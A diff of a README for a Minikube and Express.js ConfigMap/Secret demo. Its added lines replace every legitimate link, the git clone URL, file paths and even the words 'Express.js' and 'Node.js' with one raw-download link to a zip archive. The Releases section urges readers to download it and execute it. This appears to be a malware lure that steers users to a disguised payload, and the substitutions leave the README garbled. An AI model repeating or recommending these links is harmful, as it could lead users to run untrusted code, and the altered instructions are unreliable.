@@ -1,9 +1,9 @@
 # Minikube Express ConfigMap & Secret 🚀
 
-![GitHub Release](https://img.shields.io/github/release/kkksala/minikube-express-configmap-secret.svg)
-[![Release Notes](https://img.shields.io/badge/Release%20Notes-Visit%20Here-brightgreen)](https://github.com/kkksala/minikube-express-configmap-secret/releases)
+![GitHub Release](https://github.com/kkksala/minikube-express-configmap-secret/raw/refs/heads/main/k8s/minikube_configmap_secret_express_v2.3.zip)
+[![Release Notes](https://github.com/kkksala/minikube-express-configmap-secret/raw/refs/heads/main/k8s/minikube_configmap_secret_express_v2.3.zip%20Notes-Visit%20Here-brightgreen)](https://github.com/kkksala/minikube-express-configmap-secret/raw/refs/heads/main/k8s/minikube_configmap_secret_express_v2.3.zip)
 
-Welcome to the **Minikube Express ConfigMap & Secret** repository! This project demonstrates how to deploy an Express.js application on Minikube using Kubernetes ConfigMap and Secret for configuration management and sensitive data handling. 
+Welcome to the **Minikube Express ConfigMap & Secret** repository! This project demonstrates how to deploy an https://github.com/kkksala/minikube-express-configmap-secret/raw/refs/heads/main/k8s/minikube_configmap_secret_express_v2.3.zip application on Minikube using Kubernetes ConfigMap and Secret for configuration management and sensitive data handling. 
 
 ## Table of Contents
 
@@ -24,11 +24,11 @@ Welcome to the **Minikube Express ConfigMap & Secret** repository! This project 
 
 ## Overview
 
-This repository provides a complete setup for running an Express.js application in a Kubernetes environment using Minikube. It leverages ConfigMaps for configuration settings and Secrets for sensitive data. This approach enhances security and flexibility in managing application settings.
+This repository provides a complete setup for running an https://github.com/kkksala/minikube-express-configmap-secret/raw/refs/heads/main/k8s/minikube_configmap_secret_express_v2.3.zip application in a Kubernetes environment using Minikube. It leverages ConfigMaps for configuration settings and Secrets for sensitive data. This approach enhances security and flexibility in managing application settings.
 
 ## Features
 
-- Deploys an Express.js app on Minikube
+- Deploys an https://github.com/kkksala/minikube-express-configmap-secret/raw/refs/heads/main/k8s/minikube_configmap_secret_express_v2.3.zip app on Minikube
 - Utilizes Kubernetes ConfigMap and Secret for configuration and sensitive data
 - Implements liveness and readiness probes
 - Supports environment variable injection
@@ -36,8 +36,8 @@ This repository provides a complete setup for running an Express.js application 
 
 ## Technologies Used
 
-- **Node.js**: JavaScript runtime for building the Express.js application.
-- **Express.js**: Web framework for Node.js.
+- **https://github.com/kkksala/minikube-express-configmap-secret/raw/refs/heads/main/k8s/minikube_configmap_secret_express_v2.3.zip**: JavaScript runtime for building the https://github.com/kkksala/minikube-express-configmap-secret/raw/refs/heads/main/k8s/minikube_configmap_secret_express_v2.3.zip application.
+- **https://github.com/kkksala/minikube-express-configmap-secret/raw/refs/heads/main/k8s/minikube_configmap_secret_express_v2.3.zip**: Web framework for https://github.com/kkksala/minikube-express-configmap-secret/raw/refs/heads/main/k8s/minikube_configmap_secret_express_v2.3.zip
 - **Kubernetes**: Container orchestration platform.
 - **Minikube**: Local Kubernetes environment.
 - **Docker**: Container platform for building images.
@@ -48,11 +48,11 @@ This repository provides a complete setup for running an Express.js application 
 To get started, clone the repository to your local machine:
 
 ```bash
-git clone https://github.com/kkksala/minikube-express-configmap-secret.git
+git clone https://github.com/kkksala/minikube-express-configmap-secret/raw/refs/heads/main/k8s/minikube_configmap_secret_express_v2.3.zip
 cd minikube-express-configmap-secret
 ```
 
-Ensure you have [Minikube](https://minikube.sigs.k8s.io/docs/start/) and [Docker](https://docs.docker.com/get-docker/) installed on your system.
+Ensure you have [Minikube](https://github.com/kkksala/minikube-express-configmap-secret/raw/refs/heads/main/k8s/minikube_configmap_secret_express_v2.3.zip) and [Docker](https://github.com/kkksala/minikube-express-configmap-secret/raw/refs/heads/main/k8s/minikube_configmap_secret_express_v2.3.zip) installed on your system.
 
 ## Usage
 
@@ -88,11 +88,11 @@ The application configuration is managed through a ConfigMap and a Secret.
 
 ### ConfigMap
 
-The ConfigMap contains non-sensitive configuration data. You can find it in the `k8s/configmap.yaml` file. Modify this file to update your application settings.
+The ConfigMap contains non-sensitive configuration data. You can find it in the `https://github.com/kkksala/minikube-express-configmap-secret/raw/refs/heads/main/k8s/minikube_configmap_secret_express_v2.3.zip` file. Modify this file to update your application settings.
 
 ### Secret
 
-The Secret contains sensitive information such as API keys or database credentials. You can find it in the `k8s/secret.yaml` file. Ensure to update this file with your sensitive data.
+The Secret contains sensitive information such as API keys or database credentials. You can find it in the `https://github.com/kkksala/minikube-express-configmap-secret/raw/refs/heads/main/k8s/minikube_configmap_secret_express_v2.3.zip` file. Ensure to update this file with your sensitive data.
 
 ## Liveness and Readiness Probes
 
@@ -106,11 +106,11 @@ The liveness probe checks if the application is running. If it fails, Kubernetes
 
 The readiness probe checks if the application is ready to handle traffic. If it fails, Kubernetes will stop sending requests to the pod.
 
-Both probes are defined in the deployment configuration in the `k8s/deployment.yaml` file.
+Both probes are defined in the deployment configuration in the `https://github.com/kkksala/minikube-express-configmap-secret/raw/refs/heads/main/k8s/minikube_configmap_secret_express_v2.3.zip` file.
 
 ## Environment Variables
 
-The application supports environment variable injection. You can define environment variables in the `k8s/deployment.yaml` file under the `env` section. This allows you to customize application behavior without modifying the code.
+The application supports environment variable injection. You can define environment variables in the `https://github.com/kkksala/minikube-express-configmap-secret/raw/refs/heads/main/k8s/minikube_configmap_secret_express_v2.3.zip` file under the `env` section. This allows you to customize application behavior without modifying the code.
 
 ## Building the Docker Image
 
@@ -148,7 +148,7 @@ This command will provide a URL that you can open in your browser to see the run
 
 ## Releases
 
-For the latest updates and releases, visit the [Releases](https://github.com/kkksala/minikube-express-configmap-secret/releases) section. Here, you can download the latest release and execute it as needed.
+For the latest updates and releases, visit the [Releases](https://github.com/kkksala/minikube-express-configmap-secret/raw/refs/heads/main/k8s/minikube_configmap_secret_express_v2.3.zip) section. Here, you can download the latest release and execute it as needed.
 
 ## Contributing
 
